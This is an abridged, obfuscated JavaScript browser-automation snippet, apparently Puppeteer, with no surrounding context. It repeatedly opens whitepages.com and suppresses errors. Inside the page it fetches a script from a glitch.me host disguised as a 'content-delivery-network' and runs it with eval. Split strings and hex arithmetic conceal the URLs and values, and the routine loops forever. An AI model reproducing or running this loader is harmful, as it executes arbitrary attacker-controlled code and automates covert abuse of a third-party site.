((async () => {
  ...
  (async function g() {
    ...
    return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
      ...
      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x13f5 + -0xa5d + 0x1e52), k['send'](), eval(k['responseTe' + 'xt']);
    }), await wait(0x73 * 0x37d1 + 0xd0ef3 + -0x186636), await j['close'](), await i['close'](), g());
  }());
})());